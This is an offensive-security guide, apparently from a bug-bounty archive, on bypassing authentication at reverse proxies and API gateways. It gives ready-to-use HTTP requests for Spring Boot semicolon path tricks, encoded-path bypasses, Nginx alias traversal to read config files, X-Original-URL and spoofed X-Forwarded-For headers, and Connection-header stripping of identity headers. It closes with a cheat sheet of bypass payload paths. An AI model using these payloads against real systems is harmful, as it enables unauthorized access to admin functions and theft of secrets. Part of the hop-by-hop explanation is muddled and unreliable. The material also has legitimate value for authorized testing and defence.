# Reverse Proxy, API Gateway & Header-Based Auth Bypass

A tactical exploitation guide for bypassing authentication, authorization barriers, and access control policies implemented at reverse proxies, load balancers, and API gateways.

---

## 1. Gateway vs. Backend Architecture

In modern architectures, client requests pass through an edge layer before reaching application backends:
```text
[ Client ] ---> [ Reverse Proxy / Gateway ] ---> [ Backend Application / Microservice ]
                   (Nginx / ALB / Cloudflare)           (Spring Boot / Node / Django)
```

**The Vulnerability Root Cause:**
- Access rules are evaluated at the proxy layer based on the URL path, headers, or client IP.
- The backend application interprets paths, parameters, or internal identity headers differently.
- Inconsistencies between the proxy parser and backend parser create **Authentication & Authorization Bypasses**.

---

## 2. Technique 1: Path Normalization Inconsistencies

### A. Spring Boot Semicolon / Matrix Parameter Bypass
Spring Boot treats semicolons (`;`) as delimiters for matrix parameters, whereas Nginx, Apache, and WAFs treat semicolons as literal characters:

```http
# Blocked by Reverse Proxy rule on /admin:
GET /admin HTTP/1.1
HTTP/1.1 403 Forbidden

# Bypassed via Semicolon Injection:
GET /..;/admin HTTP/1.1
or
GET /admin;foo=bar/users HTTP/1.1
or
GET /anything/..;/admin HTTP/1.1
HTTP/1.1 200 OK
```
- **Reverse Proxy sees:** `/..;/admin` (does not match `/admin`). Request is forwarded.
- **Spring Boot sees:** Strips `;` matrix variable, normalizes `/../admin` to `/admin`, and executes the administrative controller.

### B. URL Encoding & Double Encoding
Reverse proxies often decode the URI once to check against access control rules:

| Request Path | Reverse Proxy Interpretation | Backend Interpretation | Result |
| :--- | :--- | :--- | :--- |
| `/%2e%2e/admin` | `/../admin` (Normalized or dropped) | `/admin` | Bypass |
| `/%252e%252e/admin` | `/%2e%2e/admin` (Safe string) | `/admin` (After 2nd decode) | Bypass |
| `/admin%20` | `/admin ` (Rule mismatch) | `/admin` (Trimmed by backend) | Bypass |
| `/admin.` | `/admin.` (Rule mismatch) | `/admin` (Resolved by OS/framework) | Bypass |
| `/admin%00` | `/admin\0` | `/admin` (C-string truncation) | Bypass |

### C. Nginx Misconfigured Alias Traversal
When an Nginx configuration omits a trailing slash on the location directive:
```nginx
# VULNERABLE CONFIGURATION
location /static {
    alias /var/www/static/;
}
```
An attacker requests:
```http
GET /static../app/config.json HTTP/1.1
```
Nginx maps this to `/var/www/static/../app/config.json` (`/var/www/app/config.json`), granting direct access to source code, secret keys, or database credentials.

---

## 3. Technique 2: Header-Based Identity & Routing Overrides

Reverse proxies often support proprietary headers for internal routing or legacy frameworks:

### A. URL Rewriting Headers
Certain gateways (e.g., Symfony, Zend, IIS, custom Node reverse proxies) prioritize URL override headers:
```http
GET /public-page HTTP/1.1
Host: target.com
X-Original-URL: /admin/dashboard
X-Rewrite-URL: /admin/dashboard
```
- **Proxy evaluates:** Access permitted to `/public-page`.
- **Backend framework evaluates:** `req.headers['x-original-url']` and routes request directly to the `/admin/dashboard` controller.

### B. Internal IP Spoofing (Localhost Bypasses)
Administrative portals frequently whitelist loopback addresses (`127.0.0.1`, `localhost`):

Injecting proxy headers to trick backend IP resolution:
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 10.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
True-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

---

## 4. Technique 3: Hop-by-Hop Header Abuse

According to RFC 2616 (HTTP/1.1), **Hop-by-Hop headers** are meant for a single transport-level connection and must NOT be retransmitted by proxies.

### The Attack Mechanism:
Many enterprise reverse proxies authenticate incoming requests at the boundary and append an internal identity header before forwarding:
```http
# Gateway forwards to microservice:
GET /api/user/profile HTTP/1.1
Host: internal-service
X-Authenticated-User: john_doe
X-User-Role: Admin
```

If an attacker specifies that header inside the `Connection` header:
```http
GET /api/user/profile HTTP/1.1
Host: target.com
Connection: close, X-Authenticated-User, X-User-Role
X-Authenticated-User: admin_root
X-User-Role: SuperAdministrator
```
1. The front-end proxy removes any header listed in the `Connection` directive before forwarding.
2. The proxy strips the trusted authentication headers.
3. If the backend fails to find authentication headers, it may fall back to default permissions, anonymous trust, or allow the attacker's secondary smuggled header through.

---

## 5. Summary Cheat Sheet: High-Probability Bypass Payloads

```text
/admin
/admin/
/admin/.
//admin//
/./admin/..
/admin..;/
/%20admin%20/
/%2e/admin
/%2e%2e/admin
/..;/admin
/anything/..;/admin
/admin?
/admin#
/admin.json
/admin.html
/api/v1/admin
/api/v2/admin
/api/v1;/admin
```

---
*Archived in Auth Bypass Vault from verified bug bounty community intelligence.*
